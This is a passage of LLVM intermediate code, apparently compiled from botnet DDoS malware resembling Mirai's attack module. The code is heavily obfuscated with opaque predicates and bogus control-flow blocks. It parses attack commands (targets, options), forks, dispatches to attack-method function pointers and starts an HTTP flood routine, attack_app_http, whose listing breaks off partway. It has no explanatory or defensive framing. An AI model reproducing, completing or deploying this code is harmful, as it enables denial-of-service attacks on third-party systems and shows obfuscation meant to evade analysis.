  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart240, label %originalBB29alteredBB

originalBBpart240:                                ; preds = %originalBB29
  br label %335

; <label>:335:                                    ; preds = %originalBBpart240
  %336 = load i32, i32* %5, align 4
  %337 = add nsw i32 %336, 1
  store i32 %337, i32* %5, align 4
  br label %250

; <label>:338:                                    ; preds = %250
  br label %339

; <label>:339:                                    ; preds = %338, %218
  %340 = call i32* @__errno_location() #7
  store i32 0, i32* %340, align 4
  %341 = load i32, i32* %6, align 4
  %342 = load i8, i8* %7, align 1
  %343 = load i8, i8* %8, align 1
  %344 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %345 = load i8, i8* %9, align 1
  %346 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %341, i8 zeroext %342, i8 zeroext %343, %struct.attack_target* %344, i8 zeroext %345, %struct.attack_option* %346)
  br label %347

; <label>:347:                                    ; preds = %339, %289, %276, %259, %originalBBpart223, %93, %originalBBpart24, %41, %30, %16
  %348 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %349 = icmp ne %struct.attack_target* %348, null
  br i1 %349, label %350, label %353

; <label>:350:                                    ; preds = %347
  %351 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %352 = bitcast %struct.attack_target* %351 to i8*
  call void @free(i8* %352) #6
  br label %353

; <label>:353:                                    ; preds = %350, %347
  %354 = load i32, i32* @x.5
  %355 = load i32, i32* @y.6
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %353
  %362 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %363 = icmp ne %struct.attack_option* %362, null
  %364 = load i32, i32* @x.5
  %365 = load i32, i32* @y.6
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %363, label %372, label %376

; <label>:372:                                    ; preds = %originalBBpart244
  %373 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %374 = load i8, i8* %9, align 1
  %375 = zext i8 %374 to i32
  call void @free_opts(%struct.attack_option* %373, i32 %375)
  br label %376

; <label>:376:                                    ; preds = %372, %originalBBpart244
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %42
  %377 = load i8*, i8** %3, align 8
  %378 = getelementptr inbounds i8, i8* %377, i32 1
  store i8* %378, i8** %3, align 8
  %379 = load i8, i8* %377, align 1
  store i8 %379, i8* %8, align 1
  %380 = load i32, i32* %4, align 4
  %381 = sext i32 %380 to i64
  %_ = sub i64 %381, 1
  %gen = mul i64 %_, 1
  %382 = sub i64 %381, 1
  %383 = trunc i64 %382 to i32
  store i32 %383, i32* %4, align 4
  %384 = load i8, i8* %8, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %387 = load i8, i8* %8, align 1
  %388 = zext i8 %387 to i64
  %389 = call noalias i8* @calloc(i64 %388, i64 24) #6
  %390 = bitcast i8* %389 to %struct.attack_target*
  store %struct.attack_target* %390, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %391 = load i32, i32* %5, align 4
  %392 = load i8, i8* %8, align 1
  %393 = zext i8 %392 to i32
  %394 = icmp slt i32 %391, %393
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %136
  %395 = load i8*, i8** %3, align 8
  %396 = bitcast i8* %395 to i32*
  %397 = load i32, i32* %396, align 4
  %398 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %399 = load i32, i32* %5, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 1
  store i32 %397, i32* %402, align 4
  %403 = load i8*, i8** %3, align 8
  %404 = getelementptr inbounds i8, i8* %403, i64 4
  store i8* %404, i8** %3, align 8
  %405 = load i8*, i8** %3, align 8
  %406 = getelementptr inbounds i8, i8* %405, i32 1
  store i8* %406, i8** %3, align 8
  %407 = load i8, i8* %405, align 1
  %408 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %409 = load i32, i32* %5, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i32 0, i32 2
  store i8 %407, i8* %412, align 4
  %413 = load i32, i32* %4, align 4
  %414 = sext i32 %413 to i64
  %_15 = sub i64 %414, 5
  %gen16 = mul i64 %_15, 5
  %_17 = shl i64 %414, 5
  %415 = sub i64 %414, 5
  %416 = trunc i64 %415 to i32
  store i32 %416, i32* %4, align 4
  %417 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %418 = load i32, i32* %5, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i64 %419
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i32 0, i32 0
  %422 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %421, i32 0, i32 0
  store i16 2, i16* %422, align 4
  %423 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %424 = load i32, i32* %5, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i64 %425
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %426, i32 0, i32 1
  %428 = load i32, i32* %427, align 4
  %429 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %430 = load i32, i32* %5, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %433, i32 0, i32 2
  %435 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %434, i32 0, i32 0
  store i32 %428, i32* %435, align 4
  br label %originalBB14

originalBB21alteredBB:                            ; preds = %originalBB21, %201
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %229
  %436 = load i8, i8* %9, align 1
  %437 = zext i8 %436 to i64
  %438 = call noalias i8* @calloc(i64 %437, i64 16) #6
  %439 = bitcast i8* %438 to %struct.attack_option*
  store %struct.attack_option* %439, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %290
  %440 = load i8, i8* %12, align 1
  %441 = zext i8 %440 to i32
  %_30 = sub i32 %441, 1
  %gen31 = mul i32 %_30, 1
  %442 = add nsw i32 %441, 1
  %443 = sext i32 %442 to i64
  %444 = call noalias i8* @calloc(i64 %443, i64 1) #6
  %445 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %446 = load i32, i32* %5, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %448, i32 0, i32 0
  store i8* %444, i8** %449, align 8
  %450 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %451 = load i32, i32* %5, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %450, i64 %452
  %454 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %453, i32 0, i32 0
  %455 = load i8*, i8** %454, align 8
  %456 = load i8*, i8** %3, align 8
  %457 = load i8, i8* %12, align 1
  %458 = zext i8 %457 to i32
  call void @util_memcpy(i8* %455, i8* %456, i32 %458)
  %459 = load i8, i8* %12, align 1
  %460 = zext i8 %459 to i32
  %461 = load i8*, i8** %3, align 8
  %462 = sext i32 %460 to i64
  %463 = getelementptr inbounds i8, i8* %461, i64 %462
  store i8* %463, i8** %3, align 8
  %464 = load i8, i8* %12, align 1
  %465 = zext i8 %464 to i32
  %466 = load i32, i32* %4, align 4
  %_32 = sub i32 %466, %465
  %gen33 = mul i32 %_32, %465
  %_34 = sub i32 0, %466
  %gen35 = add i32 %_34, %465
  %_36 = sub i32 %466, %465
  %gen37 = mul i32 %_36, %465
  %_38 = shl i32 %466, %465
  %467 = sub nsw i32 %466, %465
  store i32 %467, i32* %4, align 4
  br label %originalBB29

originalBB42alteredBB:                            ; preds = %originalBB42, %353
  %468 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %469 = icmp ne %struct.attack_option* %468, null
  br label %originalBB42
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %originalBBpart24, %22
  %24 = load i32, i32* @x.7
  %25 = load i32, i32* @y.8
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i32, i32* %14, align 4
  %33 = load i8, i8* @methods_len, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp slt i32 %32, %34
  %36 = load i32, i32* @x.7
  %37 = load i32, i32* @y.8
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %89

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %46 = load i32, i32* %14, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %45, i64 %47
  %49 = load %struct.attack_method*, %struct.attack_method** %48, align 8
  %50 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %49, i32 0, i32 1
  %51 = load i8, i8* %50, align 8
  %52 = zext i8 %51 to i32
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %52, %54
  br i1 %55, label %56, label %69

; <label>:56:                                     ; preds = %44
  %57 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %58 = load i32, i32* %14, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %57, i64 %59
  %61 = load %struct.attack_method*, %struct.attack_method** %60, align 8
  %62 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %61, i32 0, i32 0
  %63 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %62, align 8
  %64 = load i32, i32* %7, align 4
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %67 = load i8, i8* %11, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %63(i32 %64, i8 zeroext %65, %struct.attack_target* %66, i8 zeroext %67, %struct.attack_option* %68)
  br label %89

; <label>:69:                                     ; preds = %44
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* @x.7
  %72 = load i32, i32* @y.8
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load i32, i32* %14, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %14, align 4
  %81 = load i32, i32* @x.7
  %82 = load i32, i32* @y.8
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %23

; <label>:89:                                     ; preds = %56, %originalBBpart2
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %23
  %90 = load i32, i32* %14, align 4
  %91 = load i8, i8* @methods_len, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %90, %92
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %94 = load i32, i32* %14, align 4
  %_ = sub i32 0, %94
  %gen = add i32 %_, 1
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %14, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %68

; <label>:9:                                      ; preds = %2
  %10 = load i32, i32* @x.9
  %11 = load i32, i32* @y.10
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  store i32 0, i32* %5, align 4
  %18 = load i32, i32* @x.9
  %19 = load i32, i32* @y.10
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %62, %originalBBpart2
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %65

; <label>:30:                                     ; preds = %26
  %31 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i64 %33
  %35 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  %37 = icmp ne i8* %36, null
  br i1 %37, label %38, label %45

; <label>:38:                                     ; preds = %30
  %39 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %39, i64 %41
  %43 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %42, i32 0, i32 0
  %44 = load i8*, i8** %43, align 8
  call void @free(i8* %44) #6
  br label %45

; <label>:45:                                     ; preds = %38, %30
  %46 = load i32, i32* @x.9
  %47 = load i32, i32* @y.10
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* @x.9
  %55 = load i32, i32* @y.10
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %62

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %5, align 4
  br label %26

; <label>:65:                                     ; preds = %26
  %66 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %67 = bitcast %struct.attack_option* %66 to i8*
  call void @free(i8* %67) #6
  br label %68

; <label>:68:                                     ; preds = %65, %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %9
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart2, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %54

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %56

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* @x.11
  %37 = load i32, i32* @y.12
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load i32, i32* %10, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %10, align 4
  %46 = load i32, i32* @x.11
  %47 = load i32, i32* @y.12
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %11

; <label>:54:                                     ; preds = %11
  %55 = load i8*, i8** %9, align 8
  store i8* %55, i8** %5, align 8
  br label %56

; <label>:56:                                     ; preds = %54, %27
  %57 = load i8*, i8** %5, align 8
  ret i8* %57

originalBBalteredBB:                              ; preds = %originalBB, %35
  %58 = load i32, i32* %10, align 4
  %_ = sub i32 %58, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %58
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 %58, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 0, %58
  %gen6 = add i32 %_5, 1
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %10, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.15
  %6 = load i32, i32* @y.16
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i32 %3, i32* %17, align 4
  %19 = load i8, i8* %14, align 1
  %20 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %21 = load i8, i8* %16, align 1
  %22 = call i8* @attack_get_opt_str(i8 zeroext %19, %struct.attack_option* %20, i8 zeroext %21, i8* null)
  store i8* %22, i8** %18, align 8
  %23 = load i8*, i8** %18, align 8
  %24 = icmp eq i8* %23, null
  %25 = load i32, i32* @x.15
  %26 = load i32, i32* @y.16
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %35

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* %17, align 4
  store i32 %34, i32* %13, align 4
  br label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i8*, i8** %18, align 8
  %37 = call i32 @inet_addr(i8* %36) #6
  store i32 %37, i32* %13, align 4
  br label %38

; <label>:38:                                     ; preds = %35, %33
  %39 = load i32, i32* %13, align 4
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %4
  %40 = alloca i32, align 4
  %41 = alloca i8, align 1
  %42 = alloca %struct.attack_option*, align 8
  %43 = alloca i8, align 1
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  store i8 %0, i8* %41, align 1
  store %struct.attack_option* %1, %struct.attack_option** %42, align 8
  store i8 %2, i8* %43, align 1
  store i32 %3, i32* %44, align 4
  %46 = load i8, i8* %41, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %42, align 8
  %48 = load i8, i8* %43, align 1
  %49 = call i8* @attack_get_opt_str(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext %48, i8* null)
  store i8* %49, i8** %45, align 8
  %50 = load i8*, i8** %45, align 8
  %51 = icmp eq i8* %50, null
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.17
  %6 = load i32, i32* @y.18
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.attack_http_state*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i16, align 2
  %28 = alloca [10241 x i8], align 16
  %29 = alloca %struct.fd_set, align 8
  %30 = alloca %struct.fd_set, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca %struct.timeval, align 8
  %34 = alloca %struct.attack_http_state*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %struct.sockaddr_in, align 4
  %41 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %42 = alloca [10240 x i8], align 16
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i32, align 4
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i32, align 4
  %50 = alloca i32, align 4
  %51 = alloca i8*, align 8
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i8*, align 8
  %63 = alloca i32, align 4
  %64 = alloca i32, align 4
  %65 = alloca i8*, align 8
  %66 = alloca i32, align 4
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  %69 = alloca i32, align 4
  %70 = alloca i32, align 4
  %71 = alloca i32, align 4
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  store i32 0, i32* %20, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %21, align 8
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i8* @attack_get_opt_str(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 20, i8* null)
  store i8* %74, i8** %22, align 8
  %75 = load i8, i8* %15, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %77 = call i8* @attack_get_opt_str(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %77, i8** %23, align 8
  %78 = load i8, i8* %15, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %80 = call i8* @attack_get_opt_str(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 8, i8* null)
  store i8* %80, i8** %24, align 8
